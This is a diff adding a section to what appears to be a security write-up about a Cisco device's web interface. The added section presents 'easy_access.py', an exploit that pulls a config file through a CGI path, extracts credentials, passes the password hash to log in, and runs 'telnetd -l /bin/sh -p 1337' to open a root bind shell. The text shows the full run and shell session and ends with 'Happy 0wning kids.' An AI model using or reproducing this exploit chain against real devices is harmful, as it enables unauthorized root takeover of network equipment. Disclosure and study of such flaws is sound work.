@@ -78,4 +78,34 @@ cisco:x:0:0:root:/bin:/bin/admin
 $
 ```
 
+### "Full Package" Exploit
+So because Cisco, you can actually pass the hash you extract and get a logged in session. So we wrote an exploit that extracts the hash and passes it.
+This is called `easy_access.py`. Because the path of the CGI binaries contains a folder named "EasyAccess".
+
+Example run of EasyAccess below...
+
+```
+$ torsocks python easy_access.py -t x.x.x.x -p 8443 -s -c "telnetd -l /bin/sh -p 1337"
+{+} Gonna go grab us a config file...
+{+} Sending request to https://x.x.x.x:8443/cgi-bin/config.exp
+{*} We seem to have found a valid config!
+{+} Extracting Creds...
+{+} Got user: cisco
+{+} Got password (hash): [redacted]
+{+} Sending request to https://x.x.x.x:8443/ to extract auth key...
+{*} Got auth_key value: 1964300002
+{+} Login Successful, we can proceed!
+{+} Ok, now to run your command: telnetd -l /bin/sh -p 1337
+{+} We don't get output so... Yeah. Shits blind.
+
+$ telnet x.x.x.x 1337
+<snip>
+BusyBox v1.2.1 (2017.10.30-07:33+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+~ # id
+uid=0(root) gid=99(nobody)
+~ # 
+```
+
 Happy 0wning kids. 
